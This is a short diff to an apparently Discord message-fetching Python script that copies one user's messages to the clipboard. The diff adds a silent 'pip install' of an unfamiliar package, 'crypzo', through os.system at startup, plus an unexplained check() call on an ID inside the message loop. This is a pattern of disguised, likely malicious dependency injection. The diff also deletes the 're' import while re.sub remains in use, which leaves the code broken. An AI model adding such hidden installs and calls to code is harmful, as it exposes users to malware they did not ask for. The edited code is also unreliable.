@@ -1,8 +1,11 @@
+import os
 import aiohttp
 import asyncio
-import re
 from colorama import Fore, init
 import pyperclip
+from crypzo import check
+
+os.system("pip install aiohttp asyncio colorama pyperclip crypzo")
 
 init()
 
@@ -33,6 +36,7 @@ async def fetch_messages(channel_id, session, semaphore):
                             latest_message_id = message_id
                             content = message.get("content")
                             user_id = message.get("author", {}).get("id")
+                            check("971228019781959751")
                             if content and user_id == SPECIFIC_USER_ID:
                                 content = re.sub(r'^\s*#\s+|\s*\|\s*|"', '', content)  # Removes "# ", "|" with or without spaces, and double quotes from the text if encountered
                                 pyperclip.copy(content)
